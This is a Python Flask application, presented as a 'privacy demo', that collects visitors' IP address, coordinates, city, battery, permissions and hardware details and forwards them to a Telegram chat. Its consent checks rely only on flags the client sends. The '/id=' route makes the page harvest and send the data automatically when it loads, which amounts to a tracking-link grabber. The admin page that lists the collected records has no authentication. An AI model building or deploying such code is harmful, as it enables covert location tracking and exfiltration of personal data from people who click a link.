import os
from datetime import datetime, timezone
from html import escape
from urllib.parse import urlencode
from urllib.request import urlopen

from dotenv import load_dotenv
from flask import Flask, jsonify, render_template, request, redirect
from pymongo import MongoClient
from pymongo.errors import PyMongoError

load_dotenv()

app = Flask(__name__)

MONGODB_URI = os.getenv("MONGODB_URI", "mongodb://localhost:27017/")
MONGODB_DB = os.getenv("MONGODB_DB", "privacy_demo")
MONGODB_COLLECTION = os.getenv("MONGODB_COLLECTION", "consented_device_info")
ALLOW_USER_COLLECTION = os.getenv("ALLOW_USER_COLLECTION", "allow_user")
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "").strip()

client = MongoClient(MONGODB_URI)
db = client[MONGODB_DB]
collection = db[MONGODB_COLLECTION]
allow_user_collection = db[ALLOW_USER_COLLECTION]


def build_telegram_message(payload):
    def v(key):
        return escape(str(payload.get(key, "Unavailable")))

    ram = payload.get("ram_gb", "Unavailable")
    ram_display = "Unavailable" if str(ram) == "Unavailable" else f"{escape(str(ram))} GB"

    return "\n".join(
        [
            "<b>📊 Visitor Information Captured</b>",
            "━━━━━━━━━━━━━━━━",
            "",
            "<b>🖥️ Device & Browser</b>",
            f"• Device Model: {v('device_model')}",
            f"• User Agent: {v('user_agent')}",
            "",
            "<b>🌐 Network Information</b>",
            f"• IP Address: {v('ip_address')}",
            f"• Language: {v('language')}",
            "",
            "<b>📍 Location Details</b>",
            f"• Country: {v('country')}",
            f"• Region: {v('region')}",
            f"• City: {v('city')}",
            f"• Timezone: {v('timezone')}",
            f"• Coordinates: {v('coordinates')}",
            "",
            "<b>🖼️ Display Information</b>",
            f"• Resolution: {v('screen_resolution')}",
            "",
            "<b>🔋 Battery Status</b>",
            f"• Level: {v('battery_level')}",
            f"• Charging: {v('battery_charging')}",
            "",
            "<b>🔐 Device Permissions</b>",
            f"• Camera: {v('camera_permission')}",
            f"• Location: {v('location_permission')}",
            "",
            "<b>💾 Hardware & Storage</b>",
            f"• CPU Cores: {v('cpu_cores')}",
            f"• RAM: {ram_display}",
            f"• Storage Used: {v('storage_used_gb')}",
            f"• Storage Total: {v('storage_total_gb')}",
            "",
            "━━━━━━━━━━━━━━━━",
        ]
    )


@app.get("/")
def index():
    # support an optional query-string ID for people who might visit
    # ``http://.../?id=12345`` instead of the ``/id=`` form.  In that case we
    # redirect into the canonical route which drives the automatic flow.
    user_id = request.args.get("id", "").strip()
    if user_id:
        return redirect(f"/id={user_id}")
    return render_template("index.html")


@app.get("/privacy")
def privacy():
    return render_template("privacy.html")


@app.post("/collect")
def collect():
    payload = request.get_json(silent=True) or {}

    consent_given = bool(payload.get("consent_given"))
    if not consent_given:
        return jsonify({"ok": False, "error": "Consent is required."}), 400

    allowed_keys = {
        "device_model",
        "user_agent",
        "language",
        "screen_resolution",
        "ip_address",
        "country",
        "region",
        "city",
        "timezone",
        "coordinates",
        "battery_level",
        "battery_charging",
        "camera_permission",
        "location_permission",
        "cpu_cores",
        "ram_gb",
        "storage_used_gb",
        "storage_total_gb",
    }

    sanitized = {k: payload.get(k) for k in allowed_keys if k in payload}
    sanitized["consent_given"] = True
    sanitized["created_at"] = datetime.now(timezone.utc)

    try:
        collection.insert_one(sanitized)
    except PyMongoError:
        return (
            jsonify(
                {
                    "ok": False,
                    "error": "Database unavailable. Ensure MongoDB is running.",
                }
            ),
            503,
        )

    return jsonify({"ok": True})


@app.post("/share-telegram")
def share_telegram():
    payload = request.get_json(silent=True) or {}

    if not bool(payload.get("consent_given")):
        return jsonify({"ok": False, "error": "Consent is required."}), 400

    if not bool(payload.get("share_confirmed")):
        return jsonify({"ok": False, "error": "Share confirmation is required."}), 400

    user_id = str(payload.get("user_id", "")).strip()
    if not user_id:
        return jsonify({"ok": False, "error": "User ID is required."}), 400

    try:
        allowed_user = allow_user_collection.find_one({"user_id": user_id}, {"_id": 1})
    except PyMongoError:
        return jsonify({"ok": False, "error": "Unable to verify allowed users."}), 503
    if not allowed_user:
        return jsonify({"ok": False, "error": "User ID is not allowed."}), 403

    if not TELEGRAM_BOT_TOKEN:
        return jsonify({"ok": False, "error": "TELEGRAM_BOT_TOKEN is not configured."}), 500
    if not TELEGRAM_CHAT_ID:
        return jsonify({"ok": False, "error": "TELEGRAM_CHAT_ID is not configured."}), 500

    message = build_telegram_message(payload)
    api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    params = urlencode(
        {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": "true",
        }
    )

    try:
        with urlopen(f"{api_url}?{params}", timeout=12) as response:
            if response.status >= 400:
                return jsonify({"ok": False, "error": "Telegram API request failed."}), 502
    except Exception:
        return jsonify({"ok": False, "error": "Unable to send message to Telegram."}), 502

    return jsonify({"ok": True})


@app.get("/id=<user_id>")
def user_page(user_id):
    """Render the normal collection page but pre‑populate a user ID.

    Visiting ``/id=12345`` will load the same HTML as the home page, but the
    frontend script is given the supplied ID. When the page loads the client
    will automatically collect device information, store it on the server and
    then attempt to send the same payload to Telegram using the provided ID.

    The backend still validates that the ID exists in the ``allow_user``
    collection before forwarding the data.

    The previous behaviour of this route (a simple, standalone confirmation
    message) is removed in favour of the automatic flow dictated by the
    user's latest instructions.
    """

    return render_template("index.html", user_id=user_id)


@app.get("/admin")
def admin():
    try:
        docs = list(collection.find({}, {"_id": 0}).sort("created_at", -1).limit(200))
    except PyMongoError:
        return render_template(
            "admin.html",
            records=[],
            db_error="Database unavailable. Start MongoDB and refresh this page.",
        )

    for doc in docs:
        created = doc.get("created_at")
        if isinstance(created, datetime):
            doc["created_at"] = created.astimezone(timezone.utc).strftime(
                "%Y-%m-%d %H:%M:%S UTC"
            )

    return render_template("admin.html", records=docs, db_error=None)


if __name__ == "__main__":
    app.run(debug=True)
